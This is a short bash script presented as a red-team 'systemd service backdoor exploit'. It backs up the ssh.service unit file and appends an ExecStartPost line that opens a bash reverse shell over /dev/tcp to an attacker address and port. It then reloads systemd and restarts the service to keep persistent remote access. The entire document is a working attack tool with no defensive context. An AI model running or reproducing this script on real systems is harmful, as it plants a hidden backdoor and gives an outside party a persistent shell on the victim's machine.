#!/bin/bash

# Red Team - Systemd Service Backdoor Exploit
# Injects a backdoor into a systemd service for persistent access

SERVICE_NAME="ssh.service"
ATTACKER_IP="192.168.1.100"
ATTACKER_PORT="5555"

echo "[+] Modifying systemd service $SERVICE_NAME to include a backdoor..."

# Backup original service file
cp /etc/systemd/system/$SERVICE_NAME /etc/systemd/system/$SERVICE_NAME.bak

# Inject reverse shell into the service file
echo "[Service]" >> /etc/systemd/system/$SERVICE_NAME
echo "ExecStartPost=/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1" >> /etc/systemd/system/$SERVICE_NAME

# Reload systemd to apply changes
systemctl daemon-reload
systemctl restart $SERVICE_NAME

echo "[+] Backdoor injected into $SERVICE_NAME. Reverse shell to $ATTACKER_IP:$ATTACKER_PORT."